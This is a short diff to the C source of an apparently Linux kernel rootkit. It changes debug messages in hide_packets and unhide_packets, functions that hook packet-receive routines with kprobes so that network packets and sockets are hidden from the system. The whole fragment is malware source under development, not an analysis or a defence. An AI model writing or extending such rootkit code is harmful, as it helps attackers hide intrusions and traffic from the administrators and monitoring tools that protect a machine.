@@ -49,7 +49,7 @@ void
 hide_packets(void)
 {
     if (atomic_inc_return(&packet_rcv_install_count) == 1) {
-        DEBUG_INFO("HIDING PACKETS %d, %d\n", rootkit.hiding_packets, rootkit.hiding_sockets);
+        DEBUG_INFO("___ HIDING PACKETS %d, %d\n", rootkit.hiding_packets, rootkit.hiding_sockets);
         p_rcv.pre_handler = g7_packet_rcv;
         p_rcv.post_handler = g7_post;
         p_rcv.fault_handler = g7_fault;
@@ -77,6 +77,7 @@ void
 unhide_packets(void)
 {
     if (atomic_dec_return(&getdents_install_count) < 1) {
+        DEBUG_INFO("___ UNHIDING PACKETS %d, %d\n", rootkit.hiding_packets, rootkit.hiding_sockets);
         unregister_kprobe(&p_rcv);
         unregister_kprobe(&tp_rcv);
         unregister_kprobe(&p_rcv_spkt);
